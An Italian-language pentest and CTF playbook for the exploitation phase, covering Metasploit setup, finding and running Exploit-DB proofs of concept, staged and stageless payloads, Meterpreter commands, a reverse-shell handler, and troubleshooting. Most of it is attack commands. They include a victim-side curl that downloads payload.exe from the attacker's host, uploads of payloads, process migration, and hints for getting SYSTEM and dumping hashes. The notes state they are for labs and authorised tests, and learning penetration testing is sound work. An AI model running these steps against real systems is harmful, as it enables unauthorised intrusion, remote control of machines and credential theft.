# 💥 Exploitation (Playbook Generale)

Appunti e snippet per la fase di **sfruttamento** delle vulnerabilità.

---

## 📌 Obiettivi

* Ottenere **RCE / shell** sul target.
* Stabilire una **sessione stabile** (Meterpreter o shell raw).
* Preparare terreno per **privilege escalation** e **post-exploitation**.

⚠️ Da usare solo in **lab, CTF o pentest autorizzati**.

---

## 🧰 Metasploit Framework (MSF)

### 🧱 Architettura dei moduli

* `exploit/` → sfruttano vulnerabilità note.
* `auxiliary/` → scanner, brute-force, servizi fake.
* `payload/` → reverse/bind shell, Meterpreter.
* `post/` → raccolta info, escalation, pivot.
* `encoder/`, `nop/` → poco usati oggi.

### 🚀 Setup rapido

```bash
msfconsole -q
db_status
workspace -a lab1
setg LHOST <IP_attaccante>
setg LPORT 4444
```

Import scans:

```bash
db_import ./scans/nmap.xml
hosts; services; vulns
```

---

## 🔎 Ricerca exploit

### Moduli già interni a MSF

Cerca in `msfconsole`:

```text
search cve:2019
search type:exploit name:ftp
```

Se presente:

```text
use exploit/multi/ftp/vsftpd_234_backdoor
info
show options
```

👉 Sono già integrati, non serve scaricarli.

---

### Exploit esterni (Exploit-DB / Searchsploit)

Quando trovi un PoC:

```bash
searchsploit Apache Tomcat
searchsploit -m exploits/multi/http/12345.py
python3 12345.py --target 10.10.10.10
```

👉 Qui devi **scaricare ed eseguire manualmente** lo script.

Puoi anche importarlo in Metasploit:

```bash
loadpath /usr/share/exploitdb/exploits/
use 12345
```

---

## 🧪 Workflow standard

1. Identifica servizio/porta/versione (Recon).
2. Trova exploit (MSF o Exploit-DB).
3. Carica modulo con `use` **oppure** scarica PoC con `-m`.
4. Imposta opzioni chiave (`RHOSTS`, `RPORT`, `LHOST`, `LPORT`, `SRVHOST`).
5. Scegli payload adatto (`show payloads`).
6. `check` se disponibile.
7. `exploit -j -z` → avvia in background.
8. `sessions -l` / `sessions -i N`.

---

## 🧨 Payload: concetti chiave

* **Staged (`/reverse_tcp`)** → piccolo loader, scarica il resto.
* **Stageless (`_reverse_tcp`)** → payload monolitico.

Trasporti comuni:

* `reverse_tcp` → semplice e diretto.
* `reverse_http/https` → stealth, bypass firewall.
* `bind_tcp` → raro in CTF moderni.

---

## 🧪 Shell & Meterpreter

### Meterpreter

```text
getuid; sysinfo
ps; migrate <pid>       # stabilizza
shell                   # passa a cmd/PowerShell
download flag.txt .
upload payload.exe C:\\Temp\\
background
```

### CMD/PowerShell nativa

* `whoami`, `dir`, `cd`, `curl`.
* Da usare per interagire come se fossi sul sistema.

👉 Ricorda: `whoami` in Meterpreter ❌, devi aprire `shell`.

---

## 📦 Trasferimento file

### Con http.server

Attaccante:

```bash
python3 -m http.server 80
```

Vittima (CMD):

```cmd
curl http://<IP_attaccante>/payload.exe -o payload.exe
```

### Con Meterpreter

```text
upload payload.exe C:\\Temp\\
download C:\\Users\\user\\Desktop\\file.txt .
```

---

## 🧩 Exploitation esterna + Handler MSF

Quando usi PoC/script esterni, apri un handler MSF per ricevere la shell:

```text
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <IP_attaccante>
set LPORT 4444
set ExitOnSession false
exploit -j
```

Poi fai eseguire il payload alla vittima (via exploit esterno, webshell, ecc.).

---

## 🧯 Troubleshooting (problemi comuni)

* ❌ **No callback** → LHOST errato (usa IP VPN/tun0).
* ❌ **hashdump fallisce** → non sei SYSTEM. Usa `getsystem` o `local_exploit_suggester`.
* ❌ **`whoami` o `cd` non funzionano** → sei in Meterpreter, apri `shell`.
* ❌ **`curl` fallisce** → non hai avviato `http.server` o porta/IP sbagliati.
* ❌ **Sessione instabile** → migra subito o usa `reverse_https`.

---

## 📊 Tabella comparativa exploit

| Fonte exploit               | Come si usa                | Esempio comando                             | Note                                                      |
| --------------------------- | -------------------------- | ------------------------------------------- | --------------------------------------------------------- |
| **Modulo MSF interno**      | `use exploit/...`          | `use exploit/multi/ftp/vsftpd_234_backdoor` | Già integrato in Metasploit                               |
| **Exploit-DB (PoC)**        | `searchsploit -m` + esegui | `python3 46540.py --target 10.10.10.10`     | Script indipendente (Python, C, Perl…)                    |
| **Exploit-DB (modulo MSF)** | `use exploit/...`          | `use exploit/windows/http/xyz_module`       | Spesso duplicato: searchsploit lo mostra, ma è già in MSF |
| **Exploit-DB PoC → MSF**    | `loadpath`                 | `loadpath /usr/share/exploitdb/exploits/`   | Per importare script PoC come moduli personalizzati       |

---

## ✅ Checklist finale

* [ ] Ho confermato la vulnerabilità (porta/versione).
* [ ] Ho scelto exploit → modulo MSF o PoC esterno.
* [ ] Ho impostato correttamente RHOSTS/RPORT.
* [ ] Ho configurato LHOST/LPORT corretti (IP VPN).
* [ ] Ho avviato l’handler o exploit.
* [ ] Ho stabilizzato la sessione (`migrate`).
* [ ] Sono pronto al post-exploitation (loot/escalation).

---
